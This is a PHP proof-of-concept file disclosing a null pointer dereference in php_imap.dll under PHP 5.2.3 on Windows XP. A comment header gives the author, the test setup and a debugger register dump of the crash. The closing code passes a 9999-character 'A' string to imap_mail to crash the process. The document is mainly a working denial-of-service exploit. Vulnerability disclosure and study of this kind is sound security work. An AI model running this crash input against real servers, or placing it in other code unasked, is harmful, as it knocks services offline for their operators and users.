<?php
/*
PHP imap_mail Null Pointer Dereference Vulnerability
-----------------------------------------------------

Discovered & Coded by: r0ut3r (writ3r [at] gmail.com)

Vulnerable dll: php_imap.dll
- Tested on WinXP SP0, PHP/5.2.3, Apache 2.2.4

Vulnerability found using RunIt Fuzzer! (private)

The argument given was A * 9999

Access violation when reading [00000000]
----------------------------------------

Registers
---------
EAX 015BBC40
ECX 0143627C ASCII ".SYNTAX-ERROR."
EDX 00C0F5F8
EBX 00000008
ESP 00C0FAAC
EBP 00000000
ESI 00000002
EDI 00000000
EIP 013EC09E php_imap.013EC09E
C 0  ES 0023 32bit 0(FFFFFFFF)
P 0  CS 001B 32bit 0(FFFFFFFF)
A 0  SS 0023 32bit 0(FFFFFFFF)
Z 0  DS 0023 32bit 0(FFFFFFFF)
S 0  FS 0038 32bit 7FFDE000(FFF)
T 0  GS 0000 NULL
D 0
O 0  LastErr ERROR_SUCCESS (00000000)
EFL 00010202 (NO,NB,NE,A,NS,PO,GE,G)
ST0 empty +UNORM 2190 00560000 00561378
ST1 empty +UNORM 2402 0012BCD0 00000001
ST2 empty +UNORM 17CD 77F516F5 FFFFFFFF
ST3 empty 0.0889391783750232330e-4933
ST4 empty +UNORM 0082 001401E4 77D43A5F
ST5 empty +UNORM 0002 77D489FF 00000000
ST6 empty 2.0000000000000000000
ST7 empty 2.0000000000000000000
               3 2 1 0      E S P U O Z D I
FST 4020  Cond 1 0 0 0  Err 0 0 1 0 0 0 0 0  (EQ)
FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1

Proof of concept below: 
*/

if (!extension_loaded("imap"))
	die("PHP_IMAP extension not loaded!");

$buff = str_repeat("A",9999);

$res = imap_mail(1, 1, $buff);
echo "boom!!\n";
?>